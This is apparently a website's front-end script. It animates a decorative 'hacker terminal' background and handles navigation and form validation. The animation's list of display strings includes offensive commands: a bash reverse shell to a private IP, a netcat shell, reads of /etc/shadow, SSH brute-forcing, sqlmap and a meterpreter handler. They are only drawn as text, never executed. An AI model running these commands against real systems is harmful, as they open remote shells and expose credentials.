// Terminal Canvas Animation
const canvas = document.getElementById('terminal-canvas');
if (canvas) {
    const ctx = canvas.getContext('2d');
    
    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    
    const commands = [
        'nmap -sV -sC 192.168.1.1',
        'nmap -p- --min-rate 5000 10.0.0.1',
        'sudo netstat -tulpn',
        'ss -tulpn',
        'ssh root@10.0.0.1',
        'cat /etc/passwd',
        'cat /etc/shadow',
        'chmod 777 exploit.sh',
        './exploit.sh',
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        'hydra -l admin -P rockyou.txt ssh://target',
        'sqlmap -u "http://target.com/?id=1" --dbs',
        'wireshark -i eth0',
        'tcpdump -i any -w capture.pcap',
        'msfconsole',
        'use exploit/multi/handler',
        'set payload windows/meterpreter/reverse_tcp',
        'ping -c 4 8.8.8.8',
        'traceroute target.com',
        'nc -lvnp 4444',
        'nc -e /bin/sh 10.0.0.1 4444',
        'john --wordlist=rockyou.txt hash.txt',
        'hashcat -m 0 hash.txt rockyou.txt',
        'gobuster dir -u http://target -w common.txt',
        'nikto -h target.com',
        'aircrack-ng -b AA:BB:CC:DD:EE:FF capture.cap',
        'airodump-ng wlan0mon',
        'arp-scan --localnet',
        'curl -X POST http://target/login',
        'grep -r "password" /var/www/',
        'find / -perm -4000 2>/dev/null',
        'find / -writable -type f 2>/dev/null',
        'ps aux | grep root',
        'whoami && id',
        'uname -a'
    ];
    
    const fontSize = 13;
    const streams = [];
    
    for (let i = 0; i < 55; i++) {
        streams.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            speed: 0.2 + Math.random() * 1.2,
            command: commands[Math.floor(Math.random() * commands.length)],
            opacity: 0.2 + Math.random() * 0.1,
            color: Math.random() > 0.6 ? '#00ff88' : Math.random() > 0.5 ? '#667eea' : '#a78bfa'
        });
    }
    
    function drawTerminal() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        streams.forEach(stream => {
            ctx.font = fontSize + 'px monospace';
            ctx.fillStyle = stream.color;
            ctx.globalAlpha = stream.opacity;
            ctx.fillText('$ ' + stream.command, stream.x, stream.y);
            
            stream.y += stream.speed;
            
            if (stream.y > canvas.height + 30) {
                stream.y = -20;
                stream.x = Math.random() * canvas.width;
                stream.command = commands[Math.floor(Math.random() * commands.length)];
                stream.color = Math.random() > 0.6 ? '#00ff88' : Math.random() > 0.5 ? '#667eea' : '#a78bfa';
            }
        });
        
        ctx.globalAlpha = 1;
    }
    
    drawTerminal();
    setInterval(drawTerminal, 40);
    
    window.addEventListener('resize', () => {
        resizeCanvas();
    });
}

// Mobile Navigation
document.addEventListener('DOMContentLoaded', function() {
    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
    const navLinks = document.querySelector('.nav-links');
    const navbar = document.querySelector('.navbar');
    
    if (mobileMenuBtn && navLinks) {
        mobileMenuBtn.addEventListener('click', function() {
            navLinks.classList.toggle('active');
            const isExpanded = navLinks.classList.contains('active');
            mobileMenuBtn.setAttribute('aria-expanded', isExpanded);
        });
    }
    
    // Close menu when clicking outside
    document.addEventListener('click', function(e) {
        if (navLinks && mobileMenuBtn && 
            !navLinks.contains(e.target) && 
            !mobileMenuBtn.contains(e.target)) {
            navLinks.classList.remove('active');
        }
    });
    
    // Ensure navbar stays fixed on scroll
    window.addEventListener('scroll', function() {
        if (navbar) {
            navbar.style.top = '0';
        }
    });
});

// Add page transition
document.addEventListener('DOMContentLoaded', function() {
    document.body.classList.add('fade-in');
});

// Form validation
const contactForm = document.querySelector('.contact-form');
if (contactForm) {
    contactForm.addEventListener('submit', function(e) {
        let valid = true;
        const inputs = contactForm.querySelectorAll('input[required], textarea[required]');
        
        inputs.forEach(input => {
            if (!input.value.trim()) {
                valid = false;
                input.style.borderColor = '#ff4444';
            } else {
                input.style.borderColor = '';
            }
        });
        
        if (!valid) {
            e.preventDefault();
        }
    });
}

// Highlight current nav item
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = window.location.pathname;
    const navLinks = document.querySelectorAll('.nav-links a');
    
    navLinks.forEach(link => {
        const linkPath = new URL(link.href).pathname;
        if (linkPath === currentPath || (currentPath === '/' && linkPath === '/')) {
            link.style.color = '#ffffff';
        }
    });
});